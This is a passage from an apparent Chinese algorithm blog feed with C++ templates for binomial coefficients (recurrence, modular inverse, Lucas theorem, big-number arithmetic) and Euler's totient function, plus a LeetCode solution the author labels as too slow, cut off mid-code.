such:</span><br><span class="hljs-comment"> * RangeModule* obj = new RangeModule();</span><br><span class="hljs-comment"> * obj-&gt;addRange(left,right);</span><br><span class="hljs-comment"> * bool param_2 = obj-&gt;queryRange(left,right);</span><br><span class="hljs-comment"> * obj-&gt;removeRange(left,right);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>求组合数的多种方法</title>
    <link href="/2022/12/30/%E6%B1%82%E7%BB%84%E5%90%88%E6%95%B0%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <url>/2022/12/30/%E6%B1%82%E7%BB%84%E5%90%88%E6%95%B0%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="递推法"><a href="#递推法" class="headerlink" title="递推法"></a>递推法</h3><p>C[a][b] &#x3D; C[a-1][b-1]+C[a-1][b];<br>很好理解，从一堆苹果中拿出一个苹果，那么从这a个苹果中取出b个苹果可根据有无这个苹果分成两种情况，得到递推式。<br>模板题：<a href="https://www.acwing.com/problem/content/887/">https://www.acwing.com/problem/content/887/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> c[N][N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">col</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=i;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!j) c[i][j]=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> c[i][j] = (c[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+c[i<span class="hljs-number">-1</span>][j])%mod;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="公式法"><a href="#公式法" class="headerlink" title="公式法"></a>公式法</h3><p>利用组合数公式，求阶乘，再利用快速幂和费马定理求相应的乘法逆元，相乘求得。<br>模板题：<a href="https://www.acwing.com/problem/content/888/">https://www.acwing.com/problem/content/888/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod= <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> fact[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res  =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%mod;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%mod;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    fact[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    fact[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;N;i++)<br>    &#123;<br>        fact[i] =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[i<span class="hljs-number">-1</span>]*i %mod;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);<br>        <span class="hljs-type">int</span> ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[a]*<span class="hljs-built_in">qkm</span>(fact[a-b],mod<span class="hljs-number">-2</span>)%mod*<span class="hljs-built_in">qkm</span>(fact[b],mod<span class="hljs-number">-2</span>)%mod;<br>        <span class="hljs-keyword">if</span>(a==b) ans =<span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="卢卡斯定理"><a href="#卢卡斯定理" class="headerlink" title="卢卡斯定理"></a>卢卡斯定理</h3><p>当a,b过大时，利用卢卡斯定理求解。<br>卢卡斯定理</p><p><img src="/upload/2022/05/image-3ab15b1dd1ac48e19e3af5625b149720.png" alt="image.png"></p><p>模板题：<a href="https://www.acwing.com/problem/content/889/">https://www.acwing.com/problem/content/889/</a></p><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,j=a;i&lt;=b;i++,j--)<br>    &#123;<br>        res = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*j%p;<br>        res = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>) res*<span class="hljs-built_in">qkm</span>(i,p<span class="hljs-number">-2</span>,p)%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lucas</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> a, <span class="hljs-type">long</span> <span class="hljs-type">long</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(a&lt;p &amp;&amp; b&lt;p) <span class="hljs-keyword">return</span> <span class="hljs-built_in">C</span>(a,b,p);<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">return</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)<span class="hljs-built_in">C</span>(a%p,b%p,p)*<span class="hljs-built_in">lucas</span>(a/p,b/p,p)%p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> a,b;<br>        <span class="hljs-type">int</span> p;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;p;<br>        cout&lt;&lt;<span class="hljs-built_in">lucas</span>(a,b,p)&lt;&lt;endl;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高精度"><a href="#高精度" class="headerlink" title="高精度"></a>高精度</h3><p>上面几种方法都求的是对一个大素数取模的值。<br>若要求准确的值则需要用到高精度以及质因数分解。<br><img src="/upload/2022/05/image-27e92f7393294f44a953e994ddb102bd.png" alt="image.png"><br>模板题：<a href="https://www.acwing.com/problem/content/submission/890/">https://www.acwing.com/problem/content/submission/890/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">5010</span>;<br><span class="hljs-type">int</span> prime[N];<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-type">int</span> cnt;<br><span class="hljs-type">int</span> sum[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ol</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=a;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!st[i]) prime[cnt++] =i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;prime[j]&lt;=a/i;j++)<br>            &#123;<br>                st[prime[j]*i] =<span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">if</span>(i%prime[j]==<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>            &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>    vector&lt;<span class="hljs-type">int</span>&gt;c;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.<span class="hljs-built_in">size</span>()||t;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i&lt;a.<span class="hljs-built_in">size</span>()) t += a[i]*b;<br>        c.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>        t = t/<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(c.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span> &amp;&amp; c.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>) c.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><span class="hljs-comment">//获取x!中 质因数p的次数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(x)<br>    &#123;<br>        res+=x/p;<br>        x=x/p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a,b;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);<br>    <span class="hljs-built_in">ol</span>(a);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;cnt;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> p =prime[i];<br>        sum[i] = <span class="hljs-built_in">get</span>(a,p)-<span class="hljs-built_in">get</span>(b,p)-<span class="hljs-built_in">get</span>(a-b,p);<span class="hljs-comment">//存储第i个素数的指数。</span><br>    &#125;<br>    vector&lt;<span class="hljs-type">int</span>&gt;res;<br>    res.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;cnt;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;sum[i];j++)<br>        &#123;<br>            res = <span class="hljs-built_in">mul</span>(res,prime[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=res.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,res[i]);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>欧拉函数</title>
    <link href="/2022/12/30/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/"/>
    <url>/2022/12/30/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p><img src="/upload/2022/05/image-5a61da7fc0b8442bbbfe2c4873f1c101.png" alt="image.png"><br>特别的，当n&#x3D;1时，欧拉函数值为1。当n为质数时，欧拉函数的值为n-1。<br>欧拉函数直接求法：<br>模板：<a href="https://www.acwing.com/problem/content/875/">https://www.acwing.com/problem/content/875/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>        <span class="hljs-type">int</span> res=x;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=x/i;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(x%i==<span class="hljs-number">0</span>)<br>            &#123;<br>                res = (res/i)*(i<span class="hljs-number">-1</span>);<br>                <span class="hljs-keyword">while</span>(x%i==<span class="hljs-number">0</span>)x/=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">1</span>) res =(res/x)*(x<span class="hljs-number">-1</span>); <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,res);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>筛法求欧拉函数:<br>模板：<a href="https://www.acwing.com/problem/content/876/">https://www.acwing.com/problem/content/876/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> prime[N];<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-type">int</span> phi[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> cnt;<br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">getol</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    phi[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!st[i])<br>        &#123;<br>            prime[cnt++]=i;<br>            phi[i] = i<span class="hljs-number">-1</span>;<span class="hljs-comment">//i是质数，欧拉函数为i-1</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;prime[j]&lt;=n/i;j++)<br>        &#123;<br>                st[prime[j]*i] =<span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">if</span>(i%prime[j]==<span class="hljs-number">0</span>)<br>                &#123;<br>                    phi[i*prime[j]] =prime[j]*phi[i];<br><span class="hljs-comment">//如果i%prime[j]为0，则prime[j]为i的质因数。</span><br><span class="hljs-comment">//prime[j]也必定为prime[j]*i的质因数。</span><br><span class="hljs-comment">//由欧拉函数公式，可推导出，phi[i*prime[j]] =prime[j]*phi[i];</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                phi[i*prime[j]] = (prime[j]<span class="hljs-number">-1</span>)*phi[i];<br><span class="hljs-comment">//如果i%prime[j]不为0，则prime[j]不为i的质因数。</span><br><span class="hljs-comment">//prime[j]*i多了一个质因数，prime[j]。</span><br><span class="hljs-comment">//由欧拉函数公式，可推导出，phi[i*prime[j]] = (prime[j]-1)*phi[i]</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        ans+= phi[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,<span class="hljs-built_in">getol</span>(n));<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>离散化+差分的坑</title>
    <link href="/2022/12/30/%E7%A6%BB%E6%95%A3%E5%8C%96+%E5%B7%AE%E5%88%86%E7%9A%84%E5%9D%91/"/>
    <url>/2022/12/30/%E7%A6%BB%E6%95%A3%E5%8C%96+%E5%B7%AE%E5%88%86%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>4月24日，周赛题T4。<br><a href="https://leetcode-cn.com/problems/number-of-flowers-in-full-bloom/">https://leetcode-cn.com/problems/number-of-flowers-in-full-bloom/</a><br>根据题目，想到离散化+差分处理。<br>tle代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">300005</span>];<br>    vector&lt;<span class="hljs-type">int</span>&gt;alls;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> r = alls.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid = (l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(alls[mid]&gt;=x) r= mid;<br>            <span class="hljs-keyword">else</span> l = l+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> l;<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">fullBloomFlowers</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; flowers, vector&lt;<span class="hljs-type">int</span>&gt;&amp; persons)</span> </span>&#123;<br>        vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;add;<br>        <span class="hljs-type">int</span> n =persons.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;flowers.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> l = flowers[i][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> r = flowers[i][<span class="hljs-number">1</span>];<br>            add.<span class="hljs-built_in">push_back</span>(&#123;l,r&#125;);<br>            alls.<span class="hljs-built_in">push_back</span>(l);<br>            alls.<span class="hljs-built_in">push_back</span>(r);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;persons.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> q = persons[i];<br>            alls.<span class="hljs-built_in">push_back</span>(q);<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>());<br>        alls.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span 